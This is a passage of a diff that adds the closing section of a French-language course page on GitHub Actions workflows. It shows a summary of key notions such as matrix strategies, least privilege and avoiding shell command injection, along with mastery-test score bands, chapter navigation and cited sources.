+      <li>Je sais restreindre les droits d’un workflow avec la directive déclarative permissions:.</li>
+      <li>Je sais utiliser les secrets GitHub sans risque de fuite dans les journaux d’exécution.</li>
+    </ul>
+    <h3>Les 8 notions à connaître absolument</h3>
+    <ol>
+      <li>Workflows déclaratifs YAML</li><li>Événements déclencheurs (push, PR, cron)</li><li>Runners hébergés & auto-hébergés</li><li>Stratégie matricielle (strategy.matrix)</li><li>Directive fail-fast</li><li>Injection de commande shell (CWE-78)</li><li>Variables d’environnement intermédiaires (env:)</li><li>Principe du moindre privilège & GITHUB_TOKEN</li>
+    </ol>
+    <p><a class="btn" href="cartes.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-cards"></use></svg> Réviser avec les flashcards</a>
+       <a class="btn" href="formules.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-file"></use></svg> Mémo syntaxe</a></p>
+  </div>
+
+<h2>10. Test de maîtrise</h2>
+
+  <div class="box box--tech">
+    <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-chart"></use></svg> Comment t'auto-évaluer</div>
+    <p>Le QCM ci-dessus est un test de maîtrise. Lis ton pourcentage :</p>
+    <div class="bands">
+      <div class="bandrow bandrow--low">Difficultés à écrire un workflow YAML basique ou utilisation naïve d’expressions dynamiques dans les commandes shell.</div>
+      <div class="bandrow bandrow--medium">Bonne maîtrise de la syntaxe de workflow, utilisation des matrices strategy.matrix et passage des paramètres par variables d’environnement.</div>
+      <div class="bandrow bandrow--high">Conception avancée de pipelines CI/CD sécurisés, épinglage cryptographique des actions, gestion du moindre privilège et durcissement anti-injections expert.</div>
+    </div>
+    <p style="margin-top:12px"><label class="checkbox"><input type="checkbox" data-mark-done> <span>Je considère ce chapitre maîtrisé (≥ 95 % au test de maîtrise).</span></label></p>
+  </div>
+
+  <div class="chnav">
+    <a class="btn" href="../sommaire.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-arrow-left"></use></svg> Sommaire</a>
+    <a class="btn btn--primary" href="chapitre6.html">Chapitre 6 — Administration Avancée, LFS, Hooks &amp; Purge d’Historique <svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-arrow-right"></use></svg></a>
+  </div>
+
+  <p class="disclaimer">Objectif de maîtrise 19/20 — ta note réelle dépend aussi de ton travail.
+  Sources : Documentation officielle Git Pro (Scott Chacon & Ben Straub), spécification Conventional Commits 1.0.0, documentation officielle GitHub Actions et guides de durcissement GitHub Security Hardening.</p>
+</main>
+
+<script src="../assets/js/cours.js"></script>
+<script src="/assets/js/code-lab.js" defer></script>
+</body>
+</html>
